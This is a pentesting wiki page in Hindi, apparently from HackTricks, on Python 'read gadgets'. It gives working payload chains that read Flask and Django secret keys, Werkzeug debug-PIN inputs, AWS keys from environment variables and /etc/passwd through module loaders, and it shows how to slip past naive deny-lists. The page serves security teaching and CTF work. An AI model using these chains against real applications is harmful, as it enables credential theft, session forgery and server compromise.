# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## मूलभूत जानकारी

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) या [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) जैसी विभिन्न vulnerabilities आपको **python internal data पढ़ने की अनुमति दे सकती हैं, लेकिन code execute करने की अनुमति नहीं देंगी**। इसलिए, एक pentester को इन read permissions का अधिकतम उपयोग करके **sensitive privileges प्राप्त करने और vulnerability को escalate करने** की आवश्यकता होगी।

### Flask - Read secret key

Flask application के main page पर संभवतः **`app`** global object मौजूद होगा, जहाँ यह **secret configured है**।
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
इस मामले में [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) के किसी भी gadget का उपयोग करके **access global objects** करना और इस object तक पहुंचना संभव है।

जिस मामले में **the vulnerability is in a different python file**, वहां files को traverse करने के लिए एक gadget की आवश्यकता होती है, ताकि मुख्य file तक पहुंचकर **global object `app.secret_key`** को **access** किया जा सके और इस key की जानकारी होने पर [**escalate privileges**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) किया जा सके।

इस [writeup](https://ctftime.org/writeup/36082) से लिया गया payload:
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
इस payload का उपयोग **`app.secret_key` पढ़ने** के लिए करें। यदि मूल bug आपको write primitive भी देता है (उदाहरण के लिए, class pollution), तो इसी path का उपयोग इसे बदलने और अधिक privileged Flask cookies को sign करने के लिए किया जा सकता है।

### Werkzeug - machine_id और node uuid

[**इस writeup के payload का उपयोग करके**](https://vozec.fr/writeups/tweedle-dum-dee/) आप **machine_id** और **uuid** node तक पहुँच सकेंगे, जो वे **private bits** हैं जिनकी आपको [**Werkzeug pin generate करने**](../../network-services-pentesting/pentesting-web/werkzeug.md) और `/console` में python console तक पहुँचने के लिए आवश्यकता है, यदि **debug mode enabled** हो:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> ध्यान दें कि वेब पेज में कुछ **error** उत्पन्न करके आप **`app.py` का server local path** प्राप्त कर सकते हैं, जो आपको **path** दे देगा।

यदि vulnerability किसी अलग Python file में है, तो main Python file से objects access करने के लिए पिछली Flask trick देखें।

### Django - SECRET_KEY और settings module

Application शुरू होने के बाद Django settings object को `sys.modules` में cache किया जाता है। केवल read primitives के साथ आप **`SECRET_KEY`**, fallback keys, database credentials या signing salts को leak कर सकते हैं:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
यदि vulnerable gadget किसी अन्य module में है, तो पहले globals को walk करें:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` current `SECRET_KEY` जितने ही valuable हैं: rotation के दौरान वे अभी भी पुराने signed values को validate करते हैं। साथ ही `SESSION_ENGINE` और `SESSION_SERIALIZER` भी leak करें, ताकि जल्दी निर्धारित किया जा सके कि impact केवल cookie forgery तक सीमित है या इससे अधिक गंभीर है। Web impact के विवरण के लिए [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) देखें।

### Module loader gadgets - source code और files पढ़ना

Loaded Python modules आमतौर पर एक `__loader__` रखते हैं। File-backed loaders अक्सर `get_source()` और `get_data()` expose करते हैं, जो तब perfect **read-only primitives** होते हैं, जब आप पहले से किसी module object तक पहुँच सकते हों लेकिन `open()` तक नहीं:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
यह **config modules, blueprints, helper files या hidden routes** को dump करने और API keys, DSNs, flag paths या अतिरिक्त gadget entry points recover करने के लिए बहुत उपयोगी है।

यदि आपके पास केवल subclass enumeration है, तो index को hard-code करने के बजाय loader को name से search करें:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

यदि आप किसी generator/coroutine object को create या reach कर सकते हैं, तो उसका frame किसी भी function `__globals__` gadget की आवश्यकता के बिना globals को leak कर सकता है। यह उन filters के विरुद्ध उपयोगी है जो केवल dunder names को block करते हैं और `gi_frame`, `ag_frame`, `cr_frame` या `f_globals` जैसे frame attributes को भूल जाते हैं:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
जब आपके पास frame globals आ जाएँ, तो अन्य gadgets (`sys.modules`, settings objects, `os.environ`, आदि) की तरह ही आगे बढ़ें। हाल के sandbox escapes में इसे बार-बार फिर से खोजा जा रहा है, क्योंकि `gi_frame` और `f_globals` dunder attributes नहीं हैं और अक्सर naive deny-lists से बच जाते हैं।

### Loaded modules के माध्यम से environment variables / cloud creds

कई jails अभी भी कहीं न कहीं `os` या `sys` import करती हैं। आप किसी भी reachable function `__init__.__globals__` का abuse करके पहले से imported `os` module तक pivot कर सकते हैं और API tokens, cloud keys या flags वाली **environment variables** को dump कर सकते हैं:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
यदि subclass index फ़िल्टर किया गया है, तो loaders का उपयोग करें:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables अक्सर read से full compromise तक पहुंचने के लिए आवश्यक एकमात्र secrets होते हैं (cloud IAM keys, database URLs, signing keys आदि)।

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) crafted component requests के माध्यम से **class pollution** की अनुमति देता था। `__init__.__globals__` जैसा property path सेट करने पर attacker component module globals और किसी भी imported modules (जैसे `settings`, `os`, `sys`) तक पहुंच सकता था। इसके बाद code execution के बिना `SECRET_KEY`, `DATABASES` या service credentials को leak किया जा सकता है। यह exploit chain पूरी तरह read-based है और ऊपर दिए गए समान dunder-gadget patterns का उपयोग करती है।

### chaining के लिए Gadget collections

Recent CTFs और pyjail research attribute access और subclass enumeration का उपयोग करके बनाए गए reliable read chains दिखाते हैं। [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) जैसी community-maintained lists सैकड़ों minimal gadgets को catalog करती हैं, जिन्हें objects से `__globals__`, `sys.modules` और अंततः sensitive data तक पहुंचने के लिए combine किया जा सकता है। Raw subclass indexes की तुलना में **attribute/name based searches** को प्राथमिकता दें, क्योंकि `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` आदि की position Python versions के बीच और extra imported libraries के साथ बदलती रहती है।

## References

- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
